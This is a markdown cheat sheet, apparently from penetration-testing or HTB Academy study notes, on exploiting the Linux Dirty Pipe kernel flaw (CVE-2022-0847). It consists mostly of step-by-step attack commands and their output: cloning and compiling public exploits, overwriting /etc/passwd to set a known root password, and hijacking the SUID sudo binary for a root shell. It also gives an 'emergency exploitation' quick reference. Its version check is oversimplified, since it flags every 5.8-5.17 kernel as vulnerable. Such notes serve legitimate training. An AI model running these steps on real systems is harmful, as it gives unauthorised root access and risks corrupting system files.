# 💧 Dirty Pipe (CVE-2022-0847)

## 🎯 Overview

Dirty Pipe kernel vulnerability allows unauthorized writing to root-owned files through pipe mechanism exploitation, similar to Dirty Cow but affecting newer kernels (5.8-5.17).

## 🚨 CVE-2022-0847 Details

### Vulnerability Info
- **Impact**: Write to arbitrary files as root with only read access
- **Affected Kernels**: 5.8 to 5.17 (including Android)
- **Mechanism**: Pipe-based unidirectional communication exploitation
- **Similar to**: Dirty Cow (CVE-2016-5195) but different attack vector

### Kernel Version Check
```bash
# Check vulnerable kernel version
uname -r
# Vulnerable: 5.8.x - 5.17.x

# Examples of vulnerable versions:
# 5.13.0-46-generic
# 5.15.0-25-generic
# 5.16.x-x-generic
```

## 🚀 Exploitation

### Download and Compile Exploits
```bash
# Download Dirty Pipe exploits
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits

# Compile both exploits
bash compile.sh
# Creates: exploit-1, exploit-2
```

### Method 1: /etc/passwd Modification
```bash
# Exploit-1 modifies /etc/passwd to remove root password
./exploit-1

# Output:
# Backing up /etc/passwd to /tmp/passwd.bak ...
# Setting root password to "piped"...
# Password: [enter "piped"]
# Restoring /etc/passwd from /tmp/passwd.bak...
# Done! Popping shell...

# Root shell obtained
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Method 2: SUID Binary Hijacking
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null | head -10

# Execute exploit-2 with SUID binary path
./exploit-2 /usr/bin/sudo

# Output:
# [+] hijacking suid binary..
# [+] dropping suid shell..
# [+] restoring suid binary..
# [+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# Root shell obtained
id
# uid=0(root) gid=0(root) groups=0(root)
```

## 🔧 Alternative Exploits

### Other Dirty Pipe PoCs
```bash
# Additional implementations
git clone https://github.com/febinrev/CVE-2022-0847-DirtyPipe-Exploit.git
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git

# Compile and execute
gcc -o dirtypipe exploit.c
./dirtypipe
```

### Manual File Modification
```bash
# Basic concept - write to read-only files
# Requires understanding of pipe mechanics
# Advanced exploitation technique
```

## 🔍 Detection & Enumeration

### Dirty Pipe Vulnerability Check
```bash
#!/bin/bash
echo "=== DIRTY PIPE VULNERABILITY CHECK ==="

kernel_version=$(uname -r | cut -d'-' -f1)
echo "Kernel version: $kernel_version"

# Check if kernel version is in vulnerable range
if echo "$kernel_version" | grep -qE "^5\.(8|9|10|11|12|13|14|15|16|17)\."; then
    echo "[!] VULNERABLE to CVE-2022-0847 (Dirty Pipe)"
    echo "Affected range: 5.8.x - 5.17.x"
    echo "Download: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git"
else
    echo "[-] Not vulnerable to Dirty Pipe"
fi

echo "[+] Checking for gcc compiler:"
which gcc 2>/dev/null && echo "Compiler available for exploit compilation"
```

### Quick Kernel Check
```bash
# One-liner vulnerability check
uname -r | grep -qE "^5\.(8|9|10|11|12|13|14|15|16|17)\." && echo "VULNERABLE to Dirty Pipe" || echo "Not vulnerable"
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Kernel version vulnerability
uname -r | grep -E "^5\.(8|9|10|11|12|13|14|15|16|17)\."

# Compiler availability
which gcc g++
```

### Emergency Exploitation
```bash
# Quick Dirty Pipe exploitation
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# Method 1: passwd modification
./exploit-1
# Password: piped

# Method 2: SUID hijacking  
./exploit-2 /usr/bin/sudo
```

### HTB Academy Example
```bash
# 1. Connect to target
ssh htb-student@target

# 2. Check kernel version
uname -r
# Verify: 5.8.x - 5.17.x

# 3. Download and compile
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# 4. Execute exploit
./exploit-1  # or ./exploit-2 /usr/bin/sudo

# 5. Get root shell and read flag
cat /root/flag.txt
```

## ⚠️ Exploit Considerations

### Dirty Pipe Characteristics
- **Kernel-level vulnerability** - Direct kernel exploitation
- **High reliability** - Works on most affected systems
- **File corruption risk** - Can damage system files
- **Cleanup required** - exploit-2 creates /tmp/sh

### Limitations
- **Specific kernel range** - Only 5.8-5.17
- **Compilation needed** - Requires gcc on target
- **Modern systems patched** - Fixed in newer kernels
- **Detection possible** - Kernel module monitoring

---

*Dirty Pipe (CVE-2022-0847) exploits kernel pipe mechanisms for arbitrary file writes - any user can modify root-owned files, leading to immediate privilege escalation on vulnerable kernel versions.* 